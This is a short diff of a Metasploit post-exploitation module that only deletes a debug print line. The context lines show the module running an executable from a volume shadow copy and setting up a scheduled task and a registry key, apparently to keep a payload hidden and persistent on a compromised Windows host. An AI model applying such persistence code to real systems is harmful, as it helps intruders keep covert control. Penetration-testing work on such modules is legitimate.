@@ -73,7 +73,6 @@ class Metasploit4 < Msf::Post
       cmd_regex = /HarddiskVolumeShadowCopy\d{1,9}/.match("#{line}")
       volume_data_id = "#{cmd_regex}"
     end
-    print_good("#{volume_data_id}")
     execute_executable(volume_data_id, @location, @file_name)
     schtasks(volume_data_id, @location, @file_name)
     regkey(@glogal_location)
